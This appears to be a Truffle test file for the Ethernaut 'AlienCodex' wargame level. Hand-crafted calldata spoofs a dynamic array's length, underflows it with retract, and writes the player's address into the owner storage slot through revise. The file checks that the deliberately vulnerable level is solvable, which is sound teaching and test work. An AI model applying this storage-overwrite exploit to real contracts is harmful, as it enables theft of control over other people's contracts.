const AlienCodex = artifacts.require('./levels/AlienCodex.sol')
const AlienCodexFactory = artifacts.require('./levels/AlienCodexFactory.sol')

const Ethernaut = artifacts.require('./Ethernaut.sol')

import * as utils from '../utils/TestUtils'
import expectThrow from 'zeppelin-solidity/test/helpers/expectThrow'
import toPromise from 'zeppelin-solidity/test/helpers/toPromise'

contract('AlienCodex', function(accounts) {

  let ethernaut
  let level
  let instance
  let owner = accounts[1]
  let player = accounts[0]

  before(async function() {
    ethernaut = await Ethernaut.new();
    level = await AlienCodexFactory.new()
    await ethernaut.registerLevel(level.address)
    instance = await utils.createLevelInstance(
      ethernaut, level.address, player, AlienCodex,
      {from: player}
    )
  });

  describe('instance', function() {

    it('should not be immediately solvable', async function() {

      // Player is not owner yet
      assert.notEqual(player, owner);

      // Player hasn't made first contact yet
      let status = await instance.contact.call();
      assert.isFalse(status);
    }) 

    it('should allow the user to join AlienCodex, with arbitrary length', async function() {
      
      let _data = web3.sha3("make_contact(bytes32[])").substring(0, 10);
      const array_loc = '0000000000000000000000000000000000000000000000000000000000000020';
      const long_length = 'F000000000000000000000000000000000000000000000000000000000000001';
      const arbitrary_val = '0000000000000000000000000000000000000000000000000000000000000005';
      _data = _data + array_loc + long_length + arbitrary_val;
      
      await toPromise(web3.eth.sendTransaction)({
        from: player,
        to: instance.address,
        data: _data
      })
      
      // Player should have successfully made first contact
      let status = await instance.contact.call();
      assert.isTrue(status);
    });

    it('codex array should underflow, giving user all storage access to become owner', async function() {
      
      await instance.retract();

      let _data = web3.sha3("revise(uint256,bytes32)").substring(0, 10);
      // To retrieve owner ptr from array ptr, use: perl -Mbigint -E 'say ((2**256 - array_loc + 0)->as_hex)'
      const owner_loc = '4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a';
      const padding = '000000000000000000000001';
      _data = _data + owner_loc + padding + player.substr(2);
  
      await toPromise(web3.eth.sendTransaction)({
        from: player,
        to: instance.address,
        data: _data
      })
    
      // Player should own the instance now
      let ownr = await instance.owner();
      assert.equal(ownr, player);

    })
  });
});